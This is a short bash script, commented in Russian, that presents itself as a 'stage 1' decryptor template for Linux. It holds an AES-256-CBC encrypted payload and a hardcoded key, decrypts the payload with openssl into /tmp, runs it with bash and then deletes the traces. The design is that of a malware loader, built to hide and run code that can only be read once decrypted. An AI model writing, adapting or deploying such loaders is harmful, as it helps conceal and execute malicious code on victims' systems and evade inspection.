#!/bin/bash
# AES-256-CBC decryptor template for Linux stage 1

PAYLOAD="fd659f1398bcbde977eed05e09e241f1:eifTTtDp2pTLzQe+vSEjZhHkyErJI8TqPr0JNb8tSghRmg/nMxHCPrQvzxacaJKSTqjLAMXl8OfHWKF9EhVpmxvRflzA6z0sgGJp9jcVw4QBWjsW2d1b75bqRxop3lN3VwFFlaBiAub8Z/1kE9KnyOdZs2ykTdD4u5jlOtheXTbw3SLbkNEmmUt98ImHC6/T4OlGmYE+6DCgNJIVtsGQXGFIqePk0JoP3JM7DVENvSoUHCx57xfrcdhxD7Up1K4CQPi4y3fWho+vamzR+PvX+8xM1HkpRWTPc6mZxLkRx78t2+G5Geha2o4F1K8vZGnxlWqVmhD0q1uxla82KfAnkslYHmrk2fUeq1Fqv5dYPrPBqSCiJQ/9GFZOnSYcz9StnZj2O5eIuCzulwie5SUwupBkLNEYDg+XlMpihXKUfSA07ZYHbu8XCOtprAAXaApw94w1piGNhRKjGboi5DNqC03kgGBh/TXaeNq0WuQP5i0="  # encrypted ivhex:base64cipher, вставится на сборке
KEY="5a786376626e6d313233343536373839305a786376626e6d3132333435363738"      # AES ключ в HEX, совпадает с .env ENCRYPTION_KEY

iv=$(echo "$PAYLOAD" | cut -d: -f1)
cipher=$(echo "$PAYLOAD" | cut -d: -f2)

# Декодируем base64 в бинарник
echo "$cipher" | base64 -d > /tmp/cipher.bin

# Расшифровываем с помощью openssl (ключ уже в HEX, без конвертаций)
openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -in /tmp/cipher.bin -out /tmp/plaintext.sh

# Запускаем payload
bash /tmp/plaintext.sh

# Удаляем временные файлы
rm -f /tmp/cipher.bin /tmp/plaintext.sh
